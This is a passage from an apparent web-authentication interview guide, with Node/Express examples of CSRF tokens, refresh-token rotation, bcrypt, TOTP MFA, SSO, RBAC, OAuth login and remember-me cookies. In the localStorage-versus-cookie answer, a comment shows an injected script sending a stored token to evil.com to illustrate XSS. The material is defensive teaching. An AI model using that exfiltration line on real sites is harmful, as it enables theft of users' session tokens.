// Server-side refresh token rotation
const refreshTokens = new Map(); // In production, use DB/Redis

app.post('/token', async (req, res) => {
  const { refresh_token } = req.body;

  // Look up current refresh token
  const tokenData = refreshTokens.get(refresh_token);
  if (!tokenData) return res.status(401).json({ error: 'Invalid refresh token' });

  // Issue new access token
  const newAccessToken = jwt.sign(
    { userId: tokenData.userId },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  // Rotate: issue new refresh token, invalidate old one
  const newRefreshToken = crypto.randomUUID();
  refreshTokens.delete(refresh_token);                 // Invalidate old
  refreshTokens.set(newRefreshToken, {                 // Issue new
    userId: tokenData.userId,
    createdAt: Date.now()
  });

  res.json({ access_token: newAccessToken, refresh_token: newRefreshToken });
});
```

---

## 9. What is CSRF and how do you protect against it?

Cross-Site Request Forgery (CSRF) tricks an authenticated user into unknowingly executing unwanted actions on a website. Protect against it using anti-CSRF tokens (synchronizer token pattern), SameSite cookies (Strict/Lax), and requiring custom headers (e.g., X-Requested-With). For APIs, ensure idempotent methods (GET, HEAD) are safe and require tokens for state-changing requests.

```javascript
// Server: generate CSRF token
const csrfTokens = new Set();

app.get('/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  csrfTokens.add(token);
  res.cookie('csrf-token', token, { httpOnly: true, sameSite: 'strict' });
  res.json({ csrfToken: token });
});

// Server: validate CSRF token on state-changing requests
app.post('/transfer', (req, res) => {
  const csrfToken = req.headers['x-csrf-token'];
  if (!csrfToken || !csrfTokens.has(csrfToken)) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  csrfTokens.delete(csrfToken); // One-time use
  // Process transfer...
});

// Client-side: include token in header
const { csrfToken } = await (await fetch('/csrf-token', { credentials: 'include' })).json();
await fetch('/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});
```

---

## 10. What is the difference between access tokens and refresh tokens?

Access tokens authenticate API requests — they are short-lived (15–60 minutes) and should never be stored or transmitted except in Authorization headers. Refresh tokens are long-lived (days/months) and used only to obtain new access tokens without requiring the user to re-authenticate. Refresh tokens are stored more securely (server-side DB with hashing) and can be revoked.

```javascript
const jwt = require('jsonwebtoken');

// Issue both tokens on login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);

  // Short-lived access token (15 min)
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  // Long-lived refresh token (7 days)
  const refreshToken = crypto.randomUUID();
  await db.query(
    'INSERT INTO refresh_tokens (token, user_id, expires_at) VALUES ($1, $2, NOW() + INTERVAL \'7 days\')',
    [refreshToken, user.id]
  );

  res.json({ access_token: accessToken, refresh_token: refreshToken });
});

// Use refresh token to get new access token
app.post('/refresh', async (req, res) => {
  const { refresh_token } = req.body;
  const stored = await db.query(
    'SELECT * FROM refresh_tokens WHERE token = $1 AND expires_at > NOW()',
    [refresh_token]
  );
  if (!stored.rows.length) return res.status(401).end();

  const newAccessToken = jwt.sign(
    { userId: stored.rows[0].user_id },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );
  res.json({ access_token: newAccessToken });
});
```

---

## 11. How do you implement password hashing securely (e.g., bcrypt)?

Use a slow, adaptive hashing algorithm like bcrypt, argon2, or scrypt — never plain MD5/SHA. bcrypt automatically incorporates a salt and has a configurable cost factor. Always hash passwords before storing them; never log or transmit raw passwords. The cost factor should be as high as acceptable for your server's response time (typically 10–12).

```javascript
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// Registration: hash password before storing
async function registerUser(email, password) {
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
  // bcrypt.hash generates its own salt automatically
  await db.query('INSERT INTO users (email, password_hash) VALUES ($1, $2)', [email, hashedPassword]);
}

// Login: compare password against hash
async function authenticateUser(email, password) {
  const { rows } = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  if (!rows.length) return null;

  const user = rows[0];
  const match = await bcrypt.compare(password, user.password_hash);
  // bcrypt.compare extracts the salt from the stored hash
  return match ? user : null;
}

// Verify the hash format:
console.log(hashedPassword);
// $2b$12$RzLq.... -- $2b$ = algorithm, 12 = cost, rest = salt+hash
```

---

## 12. What is multi-factor authentication (MFA) and how does it improve security?

MFA requires two or more factors from different categories: something you know (password), something you have (phone/authenticator app), something you are (fingerprint/face). It drastically reduces the risk of account takeover because compromising one factor (e.g., password via phishing) is insufficient without the second factor (e.g., TOTP code).

```javascript
const speakeasy = require('speakeasy');
const qrcode = require('qrcode');

// Setup: generate a secret for the user
const secret = speakeasy.generateSecret({ name: 'MyApp:alice@example.com' });
await db.query('UPDATE users SET totp_secret = $1 WHERE email = $2', [secret.base32, 'alice@example.com']);

// Show QR code to user (to add to authenticator app)
const qrDataUrl = await qrcode.toDataURL(secret.otpauth_url);

// Verify: check the token from user's authenticator app
app.post('/verify-mfa', async (req, res) => {
  const { email, token } = req.body;
  const { rows } = await db.query('SELECT totp_secret FROM users WHERE email = $1', [email]);

  const verified = speakeasy.totp.verify({
    secret: rows[0].totp_secret,
    encoding: 'base32',
    token,
    window: 1 // Allow 30s clock drift
  });

  if (!verified) return res.status(401).json({ error: 'Invalid MFA code' });
  // Proceed to issue tokens
});
```

---

## 13. What is Single Sign-On (SSO) and how does it work?

SSO allows a user to authenticate once and gain access to multiple independent applications without re-entering credentials. It typically uses a centralized Identity Provider (IdP) via SAML, OAuth 2.0, or OpenID Connect. The IdP issues a signed assertion or token that downstream service providers trust, eliminating password fatigue and reducing phishing surface area.

```javascript
// Service Provider validates token from Identity Provider
app.post('/sso/login', async (req, res) => {
  const { id_token } = req.body;

  // Verify the ID token from the IdP (e.g., Google, Auth0, Okta)
  const decoded = jwt.verify(id_token, IDP_PUBLIC_KEY, {
    issuer: 'https://accounts.myidp.com',
    audience: CLIENT_ID
  });

  // Check if user exists in our system, create if not
  let user = await db.query('SELECT * FROM users WHERE sso_id = $1', [decoded.sub]);
  if (!user.rows.length) {
    user = await db.query(
      'INSERT INTO users (sso_id, email, name) VALUES ($1, $2, $3) RETURNING *',
      [decoded.sub, decoded.email, decoded.name]
    );
  }

  // Issue our own session token
  const sessionToken = jwt.sign({ userId: user.rows[0].id }, APP_SECRET, { expiresIn: '1h' });
  res.json({ token: sessionToken });
});
```

---

## 14. What is the difference between stateless and stateful authentication?

Stateful authentication stores session data on the server (DB, Redis) and gives the client a session ID — the server must look up the session on each request. Stateless authentication (JWT) encodes all necessary user data in the token itself — the server validates the signature without any server-side storage. Stateless scales better horizontally but cannot revoke sessions instantly without a blacklist.

```javascript
// Stateful: server stores session data in Redis
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  const sessionId = crypto.randomUUID();
  await redis.set(`session:${sessionId}`, JSON.stringify({ userId: user.id, role: user.role }), 'EX', 86400);
  res.cookie('session_id', sessionId, { httpOnly: true });
});

app.get('/profile', async (req, res) => {
  const session = await redis.get(`session:${req.cookies.session_id}`);
  if (!session) return res.status(401).end();
  const user = JSON.parse(session);
  // Can revoke instantly: redis.del(`session:${sessionId}`)
  res.json({ userId: user.userId });
});

// Stateless: all data in JWT, can't revoke without a blacklist
app.post('/login', (req, res) => {
  const user = authenticate(req.body);
  const token = jwt.sign({ userId: user.id, role: user.role }, SECRET, { expiresIn: '1h' });
  res.json({ token });
});

app.get('/profile', authenticateToken, (req, res) => {
  // Validate signature only — no DB/Redis lookup
  res.json({ userId: req.user.userId });
});
```

---

## 15. How would you implement role-based access control (RBAC)?

RBAC maps users to roles and roles to permissions. Store users in one table, roles in another, and a user_roles junction table. Check permissions in middleware by looking up the user's roles and verifying against required permissions. Prefer bitmask or string-based permission sets for efficiency.

```javascript
// Database schema
// users(id, name)
// roles(id, name)
// permissions(id, resource, action)
// user_roles(user_id, role_id)
// role_permissions(role_id, permission_id)

// Middleware for RBAC
const rolePermissions = {
  admin: ['user:read', 'user:write', 'user:delete', 'report:read'],
  editor: ['user:read', 'post:write', 'post:publish'],
  viewer: ['user:read', 'post:read']
};

function requirePermission(requiredPermission) {
  return async (req, res, next) => {
    const { rows } = await db.query(`
      SELECT r.name FROM users u
      JOIN user_roles ur ON ur.user_id = u.id
      JOIN roles r ON r.id = ur.role_id
      WHERE u.id = $1
    `, [req.user.userId]);

    const userRoles = rows.map(r => r.name);
    const hasPermission = userRoles.some(role =>
      rolePermissions[role]?.includes(requiredPermission)
    );

    if (!hasPermission) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// Usage
app.get('/api/users', authenticateToken, requirePermission('user:read'), getUsers);
app.delete('/api/users/:id', authenticateToken, requirePermission('user:delete'), deleteUser);
```

---

## 16. What is a salt in password hashing and why is it important?

A salt is a random, unique value appended to each password before hashing. It ensures that identical passwords produce different hashes, defeating rainbow table attacks and preventing attackers from cracking all users' passwords simultaneously. Modern libraries like bcrypt and argon2 generate and store the salt automatically as part of the output hash string.

```javascript
const bcrypt = require('bcrypt');

// Manual demonstration (bcrypt does this internally)
const crypto = require('crypto');

// Generate a random salt
const salt = crypto.randomBytes(16).toString('hex');
console.log(salt); // e.g., 'a7f3c1b2...'

// Hash password + salt using PBKDF2
crypto.pbkdf2('mypassword', salt, 100000, 64, 'sha512', (err, derivedKey) => {
  const hash = derivedKey.toString('hex');
  // Store salt + hash together
  const stored = `${salt}:${hash}`;
  console.log(stored); // 'a7f3c1b2...:9e4a2d...'
});

// With bcrypt (salt is auto-generated and embedded)
const hash = await bcrypt.hash('mypassword', 12);
console.log(hash);
// $2b$12$a7f3c1b2...9e4a2d...
// The salt is part of the output string (first 22 chars after cost)

// Without salt: same password = same hash (vulnerable to rainbow tables)
// With salt: same password = different hashes per user
```

---

## 17. What is the risk of storing JWTs in localStorage vs cookies?

localStorage is accessible via any JavaScript running on the same origin, making it vulnerable to XSS attacks — an injected script can read `localStorage.getItem('token')` and exfiltrate it. httpOnly cookies are inaccessible to JavaScript, blocking XSS-based token theft entirely. However, cookies can be vulnerable to CSRF without SameSite protection, so pair cookies with SameSite=Strict and CSRF tokens.

```javascript
// ❌ Vulnerable to XSS:
localStorage.setItem('token', jwt);
// Attacker's injected script:
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))</script>

// ✅ Safer: httpOnly cookie
res.cookie('token', jwt, {
  httpOnly: true,   // JS cannot read it
  secure: true,     // HTTPS only
  sameSite: 'strict' // CSRF protection
});

// ✅ Even better: split token approach
// Access token in memory (not persisted), refresh token in httpOnly cookie
let accessToken = null;
app.post('/login', (req, res) => {
  accessToken = jwt.sign({ userId: 123 }, SECRET, { expiresIn: '15m' });
  const refreshToken = jwt.sign({ userId: 123 }, REFRESH_SECRET, { expiresIn: '7d' });
  res.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true, sameSite: 'strict' });
  res.json({ accessToken }); // Stays in memory
});
```

---

## 18. How do social login flows (Google, Facebook OAuth) typically work?

Social login uses OAuth 2.0 / OpenID Connect. The app redirects the user to the provider's consent page, the user authenticates and authorizes, the provider redirects back with a code, the server exchanges the code for tokens, and the ID token or userinfo endpoint provides the user's identity (email, name, profile picture). The app then links or creates a local account.

```javascript
const { OAuth2Client } = require('google-auth-library');
const client = new OAuth2Client(GOOGLE_CLIENT_ID);

// Route: redirect to Google
app.get('/auth/google', (req, res) => {
  const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${CALLBACK_URL}&response_type=code&scope=openid%20email%20profile`;
  res.redirect(url);
});

// Callback: handle the code exchange
app.get('/auth/google/callback', async (req, res) => {
  const { code } = req.query;

  // Exchange code for tokens
  const { tokens } = await client.getToken(code);

  // Verify ID token
  const ticket = await client.verifyIdToken({
    idToken: tokens.id_token,
    audience: GOOGLE_CLIENT_ID
  });

  const payload = ticket.getPayload();
  // payload.sub, payload.email, payload.name, payload.picture

  // Find or create user in local DB
  let user = await db.query('SELECT * FROM users WHERE google_id = $1', [payload.sub]);
  if (!user.rows.length) {
    user = await db.query(
      'INSERT INTO users (google_id, email, name, avatar_url) VALUES ($1, $2, $3, $4) RETURNING *',
      [payload.sub, payload.email, payload.name, payload.picture]
    );
  }

  // Issue local session token
  const token = jwt.sign({ userId: user.rows[0].id }, APP_SECRET, { expiresIn: '7d' });
  res.json({ token, user: payload.name });
});
```

---

## 19. What is token expiration and why is it important for security?

Token expiration limits the window in which a stolen or leaked token can be used. Short expiration times (15–60 minutes for access tokens, days for refresh tokens) force attackers to re-authenticate or use refresh tokens (which can be revoked). Without expiration, a leaked token grants permanent access. The `exp` claim in JWTs defines the expiration timestamp, and servers must reject expired tokens.

```javascript
const jwt = require('jsonwebtoken');

// Issue token with expiration
const token = jwt.sign(
  { userId: 123 },
  SECRET,
  { expiresIn: '15m' } // or { expiresIn: 900 } (seconds)
);

// Verify respects expiration automatically
try {
  const decoded = jwt.verify(token, SECRET);
  console.log('Valid until:', new Date(decoded.exp * 1000));
} catch (err) {
  if (err.name === 'TokenExpiredError') {
    console.log('Token expired at:', err.expiredAt);
    // Client should use refresh token to get a new access token
  }
}

// Manual expiration check
const decoded = jwt.decode(token); // No verification
const isExpired = Date.now() >= decoded.exp * 1000;
if (isExpired) {
  // Token expired — reject
}

// Best practice: short access token, longer refresh token
const accessToken = jwt.sign({ userId: 123 }, ACCESS_SECRET, { expiresIn: '15m' });
const refreshToken = jwt.sign({ userId: 123 }, REFRESH_SECRET, { expiresIn: '7d' });
```

---

## 20. How would you implement 'remember me' functionality securely?

Store a persistent, randomly generated remember-me token in a httpOnly cookie and in the database, hashed (never store raw tokens). On return, lookup the hashed token, re-authenticate the user, and rotate the token (issue a new one, invalidate the old). Set the cookie's maxAge to 30 days and include device/browser fingerprinting for additional verification.

```javascript
const crypto = require('crypto');
const bcrypt = require('bcrypt');

// Login with "remember me"
app.post('/login', async (req, res) => {
  const { email, password, rememberMe } = req.body;
  const user = await authenticateUser(email, password);
  if (!user) return res.status(401).end();

  // Issue short-lived session token (always)
  const accessToken = jwt.sign({ userId: user.id }, ACCESS_SECRET, { expiresIn: '15m' });

  // If "remember me" checked, issue persistent token
  if (rememberMe) {
    const rawToken = crypto.randomBytes(32).toString('hex');
    const hashedToken = await bcrypt.hash(rawToken, 10);

    await db.query(
      'INSERT INTO remember_tokens (user_id, token_hash, device_fingerprint, expires_at) VALUES ($1, $2, $3, NOW() + INTERVAL \'30 days\')',
      [user.id, hashedToken, req.headers['user-agent']]
    );

    res.cookie('remember', rawToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
    });
  }

  res.json({ access_token: accessToken });
});

// Auto-login via remember-me cookie
app.post('/auto-login', async (req, res) => {
  const rawToken = req.cookies.remember;
  if (!rawToken) return res.status(401).end();

  const tokens = await db.query('SELECT * FROM remember_tokens WHERE expires_at > NOW()');
  for (const row of tokens.rows) {
    if (await bcrypt.compare(rawToken, row.token_hash)) {
      // Rotate: invalidate old, create new
      await db.query('DELETE FROM remember_tokens WHERE id = $1', [row.id]);
      // Issue new access token and rotate remember token...
      const accessToken = jwt.sign({ userId: row.user_id }, ACCESS_SECRET, { expiresIn: '15m' });
      return res.json({ access_token: accessToken });
    }
  }
  res.clearCookie('remember');
  res.status(401).json({ error: 'Invalid remember-me token' });
});
```

---
